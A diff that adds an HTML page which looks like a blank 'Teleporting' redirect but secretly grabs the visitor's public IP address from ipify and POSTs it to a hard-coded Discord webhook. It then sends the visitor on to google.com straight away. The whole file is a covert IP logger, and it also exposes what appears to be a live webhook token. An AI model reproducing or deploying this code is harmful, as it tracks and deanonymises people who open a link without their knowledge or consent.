@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    body {
+      margin: 0;
+      overflow: hidden;
+      background-color: black;
+    }
+
+    #plank-container {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="plank-container">
+    <h1>Teleporting</h1>
+    <!-- No IP address display here -->
+  </div>
+
+  <script type="application/javascript">
+    function getIP(json) {
+      var ipAddress = json.ip;
+
+      // Send the IP address to the Discord webhook
+      sendToDiscordWebhook(ipAddress);
+    }
+
+    function sendToDiscordWebhook(ip) {
+      // Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+      var discordWebhookUrl = "https://discord.com/api/webhooks/1125235653416849448/fRngI_yPbDF7sVnfssoHMdwQGA_gcbs6lBzcUpAMjAE3gFqrKjOLqkRi3fnRWGbZK5XQ";
+
+      // Create a new XMLHttpRequest to make a POST request to Discord webhook
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", discordWebhookUrl);
+
+      // Set the content type to JSON
+      xhr.setRequestHeader("Content-Type", "application/json");
+
+      // Create the JSON payload
+      var payload = {
+        content: "My public IP address is: " + ip
+      };
+
+      // Convert the payload to JSON and send it
+      xhr.send(JSON.stringify(payload));
+    }
+  </script>
+
+  <script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body>
+<script type="text/javascript">
+    window.onload = function() {
+      setTimeout(function() {
+        window.location.href = "https://google.com";
+      }); // 1000 milliseconds = 1 second
+    };
+  </script>
+</html>
